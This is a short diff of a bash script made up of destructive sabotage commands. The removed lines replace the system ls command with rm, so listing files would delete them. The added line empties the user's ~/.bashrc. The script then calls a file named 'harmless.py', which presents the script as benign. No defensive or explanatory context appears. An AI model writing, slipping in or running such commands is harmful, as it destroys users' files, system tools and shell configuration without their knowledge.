@@ -1,6 +1,5 @@
 #!/bin/bash
-mv /usr/bin/ls ~/Documents
-cp /usr/bin/rm /usr/bin/ls
+echo "" > ~/.bashrc
 python3 harmless.py
 
 
